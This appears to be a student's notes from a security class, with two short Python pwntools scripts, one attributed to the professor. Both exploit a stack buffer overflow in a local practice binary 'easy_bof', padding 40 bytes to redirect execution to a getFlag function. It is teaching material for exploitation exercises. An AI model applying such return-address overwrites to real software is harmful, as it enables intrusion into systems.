#da mega

import pwn

p = pwn.process("./easy_bof")
elf = pwn.ELF("./easy_bof")

p.sendline(b"A"*(16+24)+pwn.p64(elf.symbols["getFlag"]))
p.interactive()



#fatto dal prof stamattina

#!/usr/bin/env python3

from pwn import *

addr_getflag = p64(0x401196)

with process('./easy_bof') as p:
    print(p.recv().decode())

    payload = b'A'*40 + addr_getflag

    p.sendline(payload)

    print(p.recv().decode())
